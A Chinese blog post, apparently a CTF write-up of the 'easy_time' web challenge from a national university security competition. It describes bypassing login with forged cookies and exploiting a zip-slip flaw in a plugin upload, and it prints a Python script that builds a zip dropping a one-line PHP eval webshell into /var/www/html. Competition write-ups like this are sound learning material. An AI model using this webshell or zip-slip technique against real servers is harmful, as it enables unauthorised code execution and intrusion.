@@ -1,0 +1,192 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>第十九届全国大学生信息安全竞赛暨第三届“长城杯”铁人三项赛半决赛_easy_time · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2026-03-26">2026年3月26日</time>
+        
+        
+          <span class="post__readtime">2 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/CTF/">#CTF</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">第十九届全国大学生信息安全竞赛暨第三届“长城杯”铁人三项赛半决赛_easy_time</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <p>登录接口对用户输入的用户名与密码进行了校验</p>
+<p>校验通过则返回cookie visited&#x3D;yes, user&#x3D;admin</p>
+<p>但是相关信息没有在服务端存储</p>
+<p>所以只需要将在请求相关接口的时候手动把cookie加上</p>
+<p>就可以访问面板</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202603261958630.png" alt="image-20260326195843570"></p>
+<p>在上传插件的接口有上传插件功能</p>
+<p>只可以上传zip，且zip上传成功后会自动解压</p>
+<p>这时候想到了之前看过的zipslip漏洞</p>
+<p>所以就通过这个方法上传木马到 &#x2F;var&#x2F;www&#x2F;html &#x2F;</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202603261959966.png" alt="image-20260326195906897"></p>
+<p>zip制作脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        binary1 = <span class="string">b&#x27;vulhub&#x27;</span></span><br><span class="line">        binary2 = <span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;a&#x27;]);?&gt;&quot;</span></span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;test.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">        <span class="comment"># info = zipfile.ZipInfo(&quot;test.zip&quot;)</span></span><br><span class="line">        zipFile.writestr(<span class="string">&quot;test&quot;</span>, binary1)</span><br><span class="line">        zipFile.writestr(<span class="string">&quot;../../../../../../../../../../../../../../../../../../../var/www/html/1.php&quot;</span>, binary2)</span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以通过<code>/about</code>路由进行命令执行</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202603262000726.png" alt="image-20260326200022652"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202603262000767.png" alt="image-20260326200034664"></p>
+<p>这个题目的flag藏在了<code>/tmp</code>目录下。当时找了好久，甚至还怀疑题目有问题去找裁判了。。。。。</p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-12-15">2024·12·15</time>
+          <a class="related__link" href="/2024/12/15/CTF/2024.12.15CISCN&%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B/">	</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-11-01">2024·11·01</time>
+          <a class="related__link" href="/2024/11/01/CTF/ImaginaryCTF%202024/">ImaginaryCTF 2024</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-10-25">2024·10·25</time>
+          <a class="related__link" href="/2024/10/25/CTF/DownUnderCTF/">DownUnderCTF赛题复现</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2026/04/13/%E5%81%87%E5%A6%82%E6%B5%AA%E6%BC%AB%E4%B8%BB%E4%B9%89%E8%AF%97%E4%BA%BA%E4%B8%8D%E5%86%8D%E6%B5%AA%E6%BC%AB/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">假如浪漫主义诗人不再浪漫</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/11/19/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Horse/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">mazesec-Horse</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
